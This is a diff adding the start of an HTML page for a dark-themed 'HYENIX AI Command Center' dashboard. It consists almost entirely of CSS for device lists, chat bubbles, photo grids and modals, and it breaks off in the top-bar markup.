@@ -1,0 +1,3164 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI Command Center — HYENIX</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Inter:wght@400;500;600;700&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    :root {
+      --bg: #030508;
+      --bg-2: #080d15;
+      --panel: #0a0e17;
+      --panel-2: #0f1521;
+      --panel-3: #141b2b;
+      --border: #16263d;
+      --border-hi: #1e3a5f;
+      --cyan: #00d4ff;
+      --purple: #b846ff;
+      --green: #00ff88;
+      --red: #ff2e4c;
+      --amber: #ffb800;
+      --cyan-dim: rgba(0, 212, 255, 0.15);
+      --purple-dim: rgba(184, 70, 255, 0.15);
+      --green-dim: rgba(0, 255, 136, 0.15);
+      --red-dim: rgba(255, 46, 76, 0.15);
+      --amber-dim: rgba(255, 184, 0, 0.15);
+      --text: #e0f2ff;
+      --text-mid: #8ab4d4;
+      --text-dim: #4a6b8a;
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      background-image:
+        radial-gradient(ellipse at top left, rgba(0, 212, 255, 0.08) 0%, transparent 50%),
+        radial-gradient(ellipse at bottom right, rgba(184, 70, 255, 0.08) 0%, transparent 50%);
+    }
+
+    /* Topbar */
+    .topbar {
+      height: 60px;
+      background: linear-gradient(180deg, var(--panel) 0%, var(--panel-2) 100%);
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      gap: 16px;
+      position: relative;
+      z-index: 100;
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: 'Orbitron', sans-serif;
+    }
+
+    .brand-logo {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, var(--cyan), var(--purple));
+      display: grid;
+      place-items: center;
+      font-size: 16px;
+      box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
+      animation: logoPulse 3s ease-in-out infinite;
+    }
+
+    @keyframes logoPulse {
+
+      0%,
+      100% {
+        box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
+      }
+
+      50% {
+        box-shadow: 0 0 30px rgba(184, 70, 255, 0.6);
+      }
+    }
+
+    .brand-text {
+      font-size: 13px;
+      font-weight: 900;
+      letter-spacing: 2.5px;
+      background: linear-gradient(90deg, var(--cyan), var(--purple));
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .brand-sub {
+      font-size: 8px;
+      color: var(--text-dim);
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-top: 1px;
+    }
+
+    .status-pills {
+      display: flex;
+      gap: 6px;
+      margin-left: auto;
+      align-items: center;
+    }
+
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 5px 10px;
+      border-radius: 20px;
+      font-size: 10px;
+      font-weight: 600;
+      background: var(--panel-3);
+      border: 1px solid var(--border);
+      color: var(--text-mid);
+      font-family: 'Share Tech Mono', monospace;
+      white-space: nowrap;
+    }
+
+    .status-pill .dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: currentColor;
+      animation: pulse 2s infinite;
+    }
+
+    .status-pill.online {
+      color: var(--green);
+      background: var(--green-dim);
+    }
+
+    .status-pill.offline {
+      color: var(--red);
+      background: var(--red-dim);
+    }
+
+    .status-pill.thinking {
+      color: var(--amber);
+      background: var(--amber-dim);
+    }
+
+    .status-pill.ai-active {
+      color: var(--purple);
+      background: var(--purple-dim);
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.4;
+      }
+    }
+
+    .icon-btn {
+      width: 34px;
+      height: 34px;
+      border-radius: 8px;
+      background: var(--panel-3);
+      border: 1px solid var(--border);
+      color: var(--text-mid);
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      font-size: 15px;
+      transition: all 0.15s;
+    }
+
+    .icon-btn:hover {
+      border-color: var(--cyan);
+      color: var(--cyan);
+      box-shadow: 0 0 15px var(--cyan-dim);
+    }
+
+    /* Layout */
+    .main-layout {
+      display: grid;
+      grid-template-columns: 240px 1fr 280px;
+      height: calc(100vh - 60px);
+    }
+
+    /* Left sidebar */
+    .left-sidebar {
+      background: linear-gradient(180deg, var(--panel) 0%, var(--bg-2) 100%);
+      border-right: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .sidebar-header {
+      padding: 14px 14px 10px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .sidebar-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      color: var(--cyan);
+      text-transform: uppercase;
+    }
+
+    .device-count-badge {
+      background: var(--cyan-dim);
+      color: var(--cyan);
+      font-size: 9px;
+      padding: 2px 7px;
+      border-radius: 10px;
+      font-weight: 700;
+      font-family: 'Share Tech Mono', monospace;
+    }
+
+    .device-search {
+      padding: 8px 14px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .device-search input {
+      width: 100%;
+      padding: 7px 10px;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--text);
+      font-size: 11px;
+      outline: none;
+    }
+
+    .device-search input:focus {
+      border-color: var(--cyan);
+    }
+
+    .device-list {
+      flex: 1;
+      overflow-y: auto;
+      padding: 6px;
+    }
+
+    .device-list::-webkit-scrollbar {
+      width: 3px;
+    }
+
+    .device-list::-webkit-scrollbar-thumb {
+      background: var(--border-hi);
+      border-radius: 2px;
+    }
+
+    .device-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 10px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 3px;
+      border: 1px solid transparent;
+      transition: all 0.15s;
+    }
+
+    .device-item:hover {
+      background: var(--panel-2);
+      border-color: var(--border);
+    }
+
+    .device-item.selected {
+      background: linear-gradient(90deg, var(--cyan-dim), transparent);
+      border-color: var(--cyan);
+    }
+
+    .device-avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 6px;
+      background: linear-gradient(135deg, var(--purple), var(--cyan));
+      display: grid;
+      place-items: center;
+      font-weight: 700;
+      font-size: 10px;
+      color: #fff;
+      flex-shrink: 0;
+      position: relative;
+    }
+
+    .device-avatar::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      right: -1px;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      border: 2px solid var(--panel);
+      background: var(--red);
+    }
+
+    .device-item.online .device-avatar::after {
+      background: var(--green);
+      box-shadow: 0 0 6px var(--green);
+    }
+
+    .device-info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .device-name {
+      font-size: 11px;
+      font-weight: 600;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .device-id {
+      font-size: 8px;
+      color: var(--text-dim);
+      font-family: 'Share Tech Mono', monospace;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Center chat */
+    .center-area {
+      display: flex;
+      flex-direction: column;
+      background: var(--bg);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .center-area::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0, 212, 255, 0.015) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 212, 255, 0.015) 1px, transparent 1px);
+      background-size: 30px 30px;
+      pointer-events: none;
+    }
+
+    .chat-container {
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px 28px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .chat-container::-webkit-scrollbar {
+      width: 5px;
+    }
+
+    .chat-container::-webkit-scrollbar-thumb {
+      background: var(--border-hi);
+      border-radius: 3px;
+    }
+
+    .welcome-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      text-align: center;
+    }
+
+    .welcome-icon {
+      font-size: 56px;
+      margin-bottom: 16px;
+      filter: drop-shadow(0 0 30px rgba(0, 212, 255, 0.4));
+    }
+
+    .welcome-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 24px;
+      font-weight: 900;
+      letter-spacing: 3px;
+      background: linear-gradient(90deg, var(--cyan), var(--purple));
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 6px;
+    }
+
+    .welcome-subtitle {
+      font-size: 12px;
+      color: var(--text-dim);
+      margin-bottom: 28px;
+      max-width: 450px;
+    }
+
+    .quick-commands {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      max-width: 500px;
+      width: 100%;
+    }
+
+    .quick-cmd-card {
+      padding: 12px 14px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      cursor: pointer;
+      text-align: left;
+      transition: all 0.15s;
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+
+    .quick-cmd-card:hover {
+      border-color: var(--cyan);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 20px var(--cyan-dim);
+    }
+
+    .quick-cmd-icon {
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+
+    .quick-cmd-text {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .quick-cmd-title {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 1px;
+    }
+
+    .quick-cmd-desc {
+      font-size: 9px;
+      color: var(--text-dim);
+    }
+
+    /* Messages */
+    .message {
+      margin-bottom: 20px;
+      display: flex;
+      gap: 12px;
+      animation: slideIn 0.25s ease;
+      max-width: 850px;
+    }
+
+    @keyframes slideIn {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .message.user {
+      flex-direction: row-reverse;
+      margin-left: auto;
+    }
+
+    .msg-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      display: grid;
+      place-items: center;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    .message.user .msg-avatar {
+      background: linear-gradient(135deg, var(--cyan), #0088cc);
+      color: #000;
+    }
+
+    .message.assistant .msg-avatar {
+      background: linear-gradient(135deg, var(--purple), var(--cyan));
+      color: #fff;
+      box-shadow: 0 0 15px rgba(184, 70, 255, 0.4);
+    }
+
+    .msg-body {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .msg-header {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 4px;
+      font-size: 10px;
+    }
+
+    .msg-name {
+      font-weight: 700;
+      color: var(--cyan);
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 1px;
+    }
+
+    .message.user .msg-name {
+      color: var(--green);
+    }
+
+    .msg-time {
+      color: var(--text-dim);
+      font-family: 'Share Tech Mono', monospace;
+    }
+
+    .msg-bubble {
+      padding: 12px 16px;
+      border-radius: 10px;
+      font-size: 13px;
+      line-height: 1.6;
+      word-wrap: break-word;
+      position: relative;
+    }
+
+    .message.user .msg-bubble {
+      background: linear-gradient(135deg, rgba(0, 212, 255, 0.15), rgba(0, 136, 204, 0.1));
+      border: 1px solid rgba(0, 212, 255, 0.3);
+      border-top-right-radius: 3px;
+    }
+
+    .message.assistant .msg-bubble {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-top-left-radius: 3px;
+    }
+
+    .msg-actions {
+      display: flex;
+      gap: 4px;
+      margin-top: 6px;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .message:hover .msg-actions {
+      opacity: 1;
+    }
+
+    .msg-action-btn {
+      padding: 3px 8px;
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--text-mid);
+      font-size: 9px;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .msg-action-btn:hover {
+      border-color: var(--cyan);
+      color: var(--cyan);
+    }
+
+    /* Markdown-like rendering */
+    .md h1,
+    .md h2,
+    .md h3 {
+      color: var(--cyan);
+      margin: 8px 0 4px;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 14px;
+    }
+
+    .md strong {
+      color: var(--cyan);
+      font-weight: 600;
+    }
+
+    .md em {
+      color: var(--purple);
+      font-style: italic;
+    }
+
+    .md code {
+      background: var(--bg);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--green);
+    }
+
+    .md pre {
+      background: var(--bg);
+      padding: 10px;
+      border-radius: 6px;
+      overflow-x: auto;
+      margin: 8px 0;
+      border-left: 3px solid var(--cyan);
+    }
+
+    .md pre code {
+      background: none;
+      padding: 0;
+    }
+
+    .md ul,
+    .md ol {
+      padding-left: 20px;
+      margin: 6px 0;
+    }
+
+    .md li {
+      margin: 3px 0;
+    }
+
+    .md a {
+      color: var(--cyan);
+      text-decoration: underline;
+    }
+
+    /* Thinking dots */
+    .thinking-indicator {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 16px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      border-top-left-radius: 3px;
+      width: fit-content;
+    }
+
+    .thinking-dots {
+      display: flex;
+      gap: 4px;
+    }
+
+    .thinking-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--cyan);
+      animation: dotBounce 1.4s infinite;
+    }
+
+    .thinking-dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .thinking-dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes dotBounce {
+
+      0%,
+      80%,
+      100% {
+        transform: translateY(0);
+        opacity: 0.4;
+      }
+
+      40% {
+        transform: translateY(-6px);
+        opacity: 1;
+      }
+    }
+
+    .thinking-text {
+      color: var(--text-mid);
+      font-size: 11px;
+      font-family: 'Share Tech Mono', monospace;
+    }
+
+    /* AI thinking */
+    .ai-thinking {
+      background: rgba(184, 70, 255, 0.05);
+      border-left: 3px solid var(--purple);
+      padding: 8px 12px;
+      border-radius: 6px;
+      margin: 8px 0;
+      font-size: 11px;
+      color: var(--text-mid);
+      font-family: 'Share Tech Mono', monospace;
+      line-height: 1.5;
+    }
+
+    .ai-thinking::before {
+      content: '🧠 ';
+      color: var(--purple);
+    }
+
+    /* Insights */
+    .insights-list {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      margin: 10px 0;
+    }
+
+    .insight-item {
+      padding: 7px 10px;
+      border-radius: 6px;
+      font-size: 11px;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      background: var(--panel-2);
+      border-left: 3px solid var(--cyan);
+    }
+
+    .insight-item.warning {
+      border-color: var(--amber);
+    }
+
+    .insight-item.error {
+      border-color: var(--red);
+    }
+
+    .insight-item .icon {
+      flex-shrink: 0;
+    }
+
+    /* Actions */
+    .actions-list {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      margin: 10px 0;
+    }
+
+    .action-card {
+      padding: 10px 12px;
+      border-radius: 6px;
+      font-size: 11px;
+      border: 1px solid var(--border);
+      background: var(--panel-2);
+    }
+
+    .action-card.applied {
+      background: var(--green-dim);
+      border-color: var(--green);
+    }
+
+    .action-card.skipped {
+      background: var(--red-dim);
+      border-color: var(--red);
+      opacity: 0.7;
+    }
+
+    .action-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 3px;
+    }
+
+    .action-type {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 9px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    .action-card.applied .action-type {
+      color: var(--green);
+    }
+
+    .action-card.skipped .action-type {
+      color: var(--red);
+    }
+
+    .action-status {
+      font-size: 9px;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: 10px;
+    }
+
+    .action-card.applied .action-status {
+      background: var(--green-dim);
+      color: var(--green);
+    }
+
+    .action-card.skipped .action-status {
+      background: var(--red-dim);
+      color: var(--red);
+    }
+
+    .action-label {
+      color: var(--text);
+      font-size: 12px;
+      margin-bottom: 3px;
+    }
+
+    .action-detail {
+      color: var(--text-dim);
+      font-size: 10px;
+      font-family: 'Share Tech Mono', monospace;
+      margin-top: 2px;
+    }
+
+    /* Suggestions */
+    .suggestions-list {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      margin: 10px 0;
+    }
+
+    .suggestion-card {
+      padding: 8px 12px;
+      background: var(--purple-dim);
+      border: 1px solid rgba(184, 70, 255, 0.3);
+      border-radius: 6px;
+      font-size: 11px;
+      cursor: pointer;
+      transition: all 0.15s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .suggestion-card:hover {
+      background: rgba(184, 70, 255, 0.2);
+      transform: translateX(3px);
+    }
+
+    /* Photos */
+    .photo-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+      gap: 6px;
+      margin: 10px 0;
+    }
+
+    .photo-thumb {
+      width: 100%;
+      aspect-ratio: 1;
+      border-radius: 6px;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .photo-thumb:hover {
+      border-color: var(--cyan);
+      box-shadow: 0 0 10px var(--cyan-dim);
+    }
+
+    .photo-thumb img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    /* Input */
+    .input-area {
+      padding: 12px 28px 20px;
+      background: linear-gradient(180deg, transparent, var(--bg) 20%);
+      position: relative;
+      z-index: 2;
+    }
+
+    .input-container {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 4px;
+      display: flex;
+      gap: 4px;
+      align-items: flex-end;
+      transition: all 0.15s;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+    }
+
+    .input-container:focus-within {
+      border-color: var(--cyan);
+      box-shadow: 0 0 30px var(--cyan-dim), 0 8px 30px rgba(0, 0, 0, 0.4);
+    }
+
+    .command-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      padding: 12px 14px;
+      color: var(--text);
+      font-size: 13px;
+      font-family: inherit;
+      outline: none;
+      resize: none;
+      max-height: 120px;
+      min-height: 44px;
+      line-height: 1.5;
+    }
+
+    .command-input::placeholder {
+      color: var(--text-dim);
+    }
+
+    .input-btn {
+      width: 38px;
+      height: 38px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      font-size: 15px;
+      transition: all 0.15s;
+      margin: 3px;
+    }
+
+    .send-btn {
+      background: linear-gradient(135deg, var(--cyan), var(--purple));
+      color: #fff;
+      box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+    }
+
+    .send-btn:hover:not(:disabled) {
+      transform: scale(1.05);
+      box-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
+    }
+
+    .send-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .voice-btn {
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      color: var(--text-mid);
+    }
+
+    .voice-btn:hover {
+      border-color: var(--cyan);
+      color: var(--cyan);
+    }
+
+    .voice-btn.recording {
+      background: var(--red-dim);
+      border-color: var(--red);
+      color: var(--red);
+      animation: recordingPulse 1s infinite;
+    }
+
+    @keyframes recordingPulse {
+
+      0%,
+      100% {
+        box-shadow: 0 0 0 0 rgba(255, 46, 76, 0.4);
+      }
+
+      50% {
+        box-shadow: 0 0 0 8px rgba(255, 46, 76, 0);
+      }
+    }
+
+    /* Right sidebar */
+    .right-sidebar {
+      background: linear-gradient(180deg, var(--panel) 0%, var(--bg-2) 100%);
+      border-left: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+    }
+
+    .right-sidebar::-webkit-scrollbar {
+      width: 3px;
+    }
+
+    .right-sidebar::-webkit-scrollbar-thumb {
+      background: var(--border-hi);
+      border-radius: 2px;
+    }
+
+    .context-section {
+      padding: 14px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .context-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .context-title .icon {
+      color: var(--cyan);
+      font-size: 11px;
+    }
+
+    .device-context-card {
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px;
+    }
+
+    .device-context-name {
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--cyan);
+      margin-bottom: 3px;
+    }
+
+    .device-context-id {
+      font-size: 9px;
+      font-family: 'Share Tech Mono', monospace;
+      color: var(--text-dim);
+      margin-bottom: 10px;
+      word-break: break-all;
+    }
+
+    .context-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 5px 0;
+      font-size: 10px;
+      border-bottom: 1px dashed rgba(22, 38, 61, 0.5);
+    }
+
+    .context-row:last-child {
+      border-bottom: none;
+    }
+
+    .context-key {
+      color: var(--text-dim);
+    }
+
+    .context-value {
+      color: var(--text);
+      font-family: 'Share Tech Mono', monospace;
+      font-weight: 600;
+      max-width: 60%;
+      text-align: right;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .context-value.online {
+      color: var(--green);
+    }
+
+    .context-value.offline {
+      color: var(--red);
+    }
+
+    .context-value.warn {
+      color: var(--amber);
+    }
+
+    .context-value.info {
+      color: var(--cyan);
+    }
+
+    .quick-actions-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 6px;
+    }
+
+    .quick-action-btn {
+      padding: 8px 6px;
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--text);
+      cursor: pointer;
+      font-size: 9px;
+      font-weight: 600;
+      text-align: center;
+      transition: all 0.15s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+    }
+
+    .quick-action-btn:hover {
+      border-color: var(--cyan);
+      color: var(--cyan);
+    }
+
+    .quick-action-btn .q-icon {
+      font-size: 14px;
+    }
+
+    .history-item {
+      display: flex;
+      gap: 6px;
+      padding: 6px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 10px;
+      margin-bottom: 3px;
+      transition: background 0.15s;
+    }
+
+    .history-item:hover {
+      background: var(--panel-2);
+    }
+
+    .history-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: var(--cyan);
+      flex-shrink: 0;
+      margin-top: 5px;
+    }
+
+    .history-item.error .history-dot {
+      background: var(--red);
+    }
+
+    .history-item.success .history-dot {
+      background: var(--green);
+    }
+
+    .history-text {
+      flex: 1;
+      color: var(--text-mid);
+      line-height: 1.3;
+    }
+
+    .history-time {
+      font-size: 8px;
+      color: var(--text-dim);
+      font-family: 'Share Tech Mono', monospace;
+      margin-top: 1px;
+    }
+
+    /* Undo */
+    .undo-bar {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: var(--panel);
+      border: 1px solid var(--amber);
+      border-radius: 10px;
+      padding: 10px 18px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 0 30px rgba(255, 184, 0, 0.3);
+      transition: transform 0.3s;
+      z-index: 500;
+    }
+
+    .undo-bar.show {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .undo-bar-text {
+      font-size: 11px;
+    }
+
+    .undo-btn {
+      padding: 5px 12px;
+      background: var(--amber);
+      color: #000;
+      border: none;
+      border-radius: 5px;
+      font-weight: 700;
+      font-size: 10px;
+      cursor: pointer;
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 1px;
+    }
+
+    .undo-btn:hover {
+      background: #ffc933;
+    }
+
+    /* Toasts */
+    .toasts {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      z-index: 1000;
+      pointer-events: none;
+    }
+
+    .toast {
+      padding: 10px 16px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      font-size: 11px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transform: translateX(120%);
+      opacity: 0;
+      transition: all 0.3s;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+      pointer-events: auto;
+    }
+
+    .toast.show {
+      transform: translateX(0);
+      opacity: 1;
+    }
+
+    .toast.ok {
+      border-color: var(--green);
+      color: var(--green);
+    }
+
+    .toast.err {
+      border-color: var(--red);
+      color: var(--red);
+    }
+
+    .toast.info {
+      border-color: var(--cyan);
+      color: var(--cyan);
+    }
+
+    /* Command palette */
+    .palette-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(3, 5, 8, 0.85);
+      backdrop-filter: blur(8px);
+      z-index: 2000;
+      display: none;
+      align-items: flex-start;
+      justify-content: center;
+      padding-top: 15vh;
+    }
+
+    .palette-overlay.show {
+      display: flex;
+    }
+
+    .palette {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      width: 90%;
+      max-width: 500px;
+      max-height: 60vh;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+    }
+
+    .palette-input {
+      width: 100%;
+      padding: 14px 18px;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid var(--border);
+      color: var(--text);
+      font-size: 14px;
+      outline: none;
+      font-family: inherit;
+    }
+
+    .palette-list {
+      list-style: none;
+      max-height: 400px;
+      overflow-y: auto;
+      padding: 6px;
+    }
+
+    .palette-item {
+      padding: 10px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--text-mid);
+    }
+
+    .palette-item:hover,
+    .palette-item.active {
+      background: var(--cyan-dim);
+      color: var(--cyan);
+    }
+
+    .palette-item .kbd {
+      margin-left: auto;
+      padding: 2px 6px;
+      background: var(--panel-3);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      font-size: 9px;
+      font-family: 'Share Tech Mono', monospace;
+    }
+
+    /* Photo modal */
+    .photo-modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(3, 5, 8, 0.95);
+      backdrop-filter: blur(10px);
+      z-index: 3000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .photo-modal.show {
+      display: flex;
+    }
+
+    .photo-modal-content {
+      position: relative;
+      max-width: 800px;
+      width: 100%;
+      background: var(--panel);
+      border: 1px solid var(--cyan);
+      border-radius: 12px;
+      box-shadow: 0 0 60px rgba(0, 212, 255, 0.3);
+      overflow: hidden;
+    }
+
+    .photo-modal-img {
+      width: 100%;
+      max-height: 70vh;
+      object-fit: contain;
+      background: #000;
+      display: block;
+    }
+
+    .photo-modal-close {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid var(--border);
+      color: var(--text);
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      font-size: 18px;
+      z-index: 10;
+    }
+
+    .photo-modal-close:hover {
+      background: var(--red);
+      color: #fff;
+      border-color: var(--red);
+    }
+
+    .photo-modal-meta {
+      padding: 12px 18px;
+      background: var(--panel-2);
+      border-top: 1px solid var(--border);
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--cyan);
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    /* Keyboard hints */
+    .kbd-hint {
+      display: inline-block;
+      padding: 1px 5px;
+      background: var(--panel-3);
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      font-size: 9px;
+      font-family: 'Share Tech Mono', monospace;
+      color: var(--text-dim);
+    }
+
+    /* Responsive */
+    @media (max-width: 1200px) {
+      .main-layout {
+        grid-template-columns: 220px 1fr 260px;
+      }
+    }
+
+    @media (max-width: 900px) {
+      .main-layout {
+        grid-template-columns: 1fr;
+      }
+
+      .left-sidebar,
+      .right-sidebar {
+        display: none;
+      }
+
+      .chat-container {
+        padding: 14px;
+      }
+
+      .input-area {
+        padding: 10px 14px 14px;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .topbar {
+        padding: 0 10px;
+        gap: 10px;
+      }
+
+      .brand-text {
+        font-size: 11px;
+      }
+
+      .status-pill {
+        padding: 4px 8px;
+        font-size: 9px;
+      }
+
+      .quick-commands {
+        grid-template-columns: 1fr;
+      }
+
+      .welcome-title {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-logo">🤖</div>
+      <div>
+        <div class="brand-text">HYENIX AI</div>
+        <div class="brand-sub">Command Center v3.1</div>
+      </div>
+    </div>
+
+    <div class="status-pills">
+      <div class="status-pill online" id="connStatus">
